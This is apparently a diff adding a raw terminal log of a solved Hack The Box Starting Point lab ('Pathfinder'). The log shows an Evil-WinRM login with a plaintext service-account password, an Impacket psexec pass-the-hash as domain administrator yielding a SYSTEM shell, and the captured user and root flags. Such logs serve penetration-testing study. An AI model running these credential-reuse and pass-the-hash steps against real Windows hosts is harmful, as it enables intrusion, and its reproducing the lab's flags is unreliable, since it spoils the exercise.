@@ -1,0 +1,51 @@
+################ User ###################
+┌─[root@parrot]─[~/Downloads]
+└──╼ #evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
+*Evil-WinRM* PS C:\Users\svc_bes> cd Desktop
+*Evil-WinRM* PS C:\Users\svc_bes\Desktop> dir
+
+
+    Directory: C:\Users\svc_bes\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        2/25/2020   2:35 PM             32 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc_bes\Desktop> type user.txt
+b05fb166688a8603d970c6d033f637f1
+
+
+############## Root #####################
+
+┌─[✗]─[root@parrot]─[~/HackTheBox/starting-point/Pathfinder]
+└──╼ #psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.30.....
+[*] Found writable share ADMIN$
+[*] Uploading file qrZzFRVc.exe
+[*] Opening SVCManager on 10.10.10.30.....
+[*] Creating service qunF on 10.10.10.30.....
+[*] Starting service qunF.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is BEDE-E51D
+
+ Directory of C:\Users\Administrator\Desktop
+
+02/25/2020  03:33 PM    <DIR>          .
+02/25/2020  03:33 PM    <DIR>          ..
+02/25/2020  03:33 PM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  13,224,402,944 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+ee613b2d048303e5fd4ac6647d944645
